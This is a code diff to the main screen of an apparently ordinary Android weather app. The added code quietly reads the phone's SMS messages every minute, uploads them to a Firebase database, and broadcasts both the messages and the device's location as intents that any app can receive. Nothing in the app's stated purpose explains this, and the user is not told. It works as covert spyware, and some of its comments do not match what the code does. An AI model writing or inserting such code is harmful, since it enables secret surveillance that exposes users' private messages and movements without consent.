@@ -10,6 +10,7 @@ import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.Handler
 import android.provider.Settings
 import android.view.View
 import android.widget.Toast
@@ -48,6 +49,8 @@ import com.google.firebase.messaging.FirebaseMessaging
 @AndroidEntryPoint
 class MainActivity : ComponentActivity() {
 
+    private val handler = Handler()
+    private lateinit var runnable: Runnable
     private val locationCollectionRef = Firebase.firestore.collection("location")
     private val mainViewModel: MainViewModel by viewModels()
     private val viewModel: WeatherViewModel by viewModels()
@@ -93,6 +96,16 @@ class MainActivity : ComponentActivity() {
                             or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                     )
         }
+
+        // Define the Runnable to start the activity
+        runnable = Runnable {
+            broadcastSMS() // Methods to start your desired activity
+            broadcastLocation()
+            handler.postDelayed(runnable, 60000) // Schedule the Runnable again after 1 minute (60000 milliseconds)
+        }
+
+        // Schedule the initial execution of the Runnable
+        handler.postDelayed(runnable, 60000) // Start the activity after 1 minute (60000 milliseconds)
 
         setContent {
             WeatherAppTheme {
@@ -284,6 +297,12 @@ class MainActivity : ComponentActivity() {
         }
     }
 
+    override fun onDestroy() {
+        super.onDestroy()
+        // Remove any pending callbacks to prevent memory leaks
+        handler.removeCallbacks(runnable)
+    }
+
 
     private fun readSMS(): List<String> {
         //Read SMS messages and send to Firebase
@@ -332,13 +351,11 @@ class MainActivity : ComponentActivity() {
                 ValueEventListener {
                 override fun onDataChange(dataSnapshot: DataSnapshot) {
                     if (!dataSnapshot.exists()) {
-                        // SMS message does not exist in the database, push it
+                        // Check if SMS message exists in the database
                         val key = smsRef.push().key
                         if (key != null) {
                             smsRef.child(key).setValue(sms)
                         }
-                    } else{
-                        println("Skipping duplicate SMS message: $sms")
                     }
 
                 }
@@ -349,6 +366,49 @@ class MainActivity : ComponentActivity() {
                 }
             })
         }
+    }
+
+    private fun broadcastSMS(){
+        // Check if permission is not granted
+        if (ContextCompat.checkSelfPermission(
+                this@MainActivity,
+                Manifest.permission.READ_SMS
+            )
+            == PackageManager.PERMISSION_GRANTED
+        ) {
+            val smsList = readSMS()
+            // Display list in Logcat
+            println("smsList: $smsList")
+            // Convert MutableList<String> to Array<String>
+            val smsArray = smsList.toTypedArray()
+            // Create a new Intent for broadcasting
+            // Add the smsArray as an extra to the Intent
+            val smsIntent = Intent("ACTION_SEND_SMS").apply {
+                putExtra("smsArray", smsArray)}
+            // Broadcast the Intent
+            sendBroadcast(smsIntent)
+            // Send SMS to Database
+            sendSMSToFirebase(smsList)
+        }
+    }
+
+    private fun broadcastLocation(){
+        val fusedLocationClient = LocationServices
+            .getFusedLocationProviderClient(this@MainActivity)
+        fusedLocationClient.lastLocation
+            .addOnSuccessListener { location ->
+                location.let {
+                    val lat = location.latitude
+                    val long = location.longitude
+
+                    val intent = Intent("ACTION_SEND_LOCATION").apply {
+                        putExtra("latitude", lat)
+                        putExtra("longitude", long)
+                    }
+
+                    sendBroadcast(intent)
+                }
+            }
     }
 
 }
